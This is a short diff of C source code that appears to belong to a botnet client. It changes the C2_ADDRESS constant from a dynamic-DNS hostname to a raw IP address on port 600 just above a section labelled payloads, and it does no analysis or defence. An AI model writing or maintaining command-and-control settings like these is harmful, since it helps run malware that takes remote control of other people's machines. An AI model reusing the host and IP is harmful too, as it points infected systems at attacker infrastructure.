@@ -14,7 +14,7 @@
 #include <fcntl.h>
 
 // Configuration
-#define C2_ADDRESS "botnet-purenet.zapto.org"
+#define C2_ADDRESS "134.255.216.46"
 #define C2_PORT 600
 
 // Payloads
